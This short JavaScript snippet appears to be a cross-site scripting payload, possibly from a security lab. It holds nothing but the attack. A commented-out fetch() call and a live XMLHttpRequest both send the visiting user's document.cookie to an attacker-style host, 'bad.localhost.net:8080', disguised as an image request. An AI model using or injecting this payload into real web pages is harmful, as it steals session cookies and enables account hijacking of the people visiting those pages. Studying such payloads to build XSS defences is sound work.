//fetch("http://bad.localhost.net:8080/steal-cookie.jpg?cookie=" + document.cookie);

var xhttp = new XMLHttpRequest();
xhttp.open("GET", "http://bad.localhost.net:8080/steal-cookie.jpg?cookie=" + document.cookie, true);
xhttp.send();
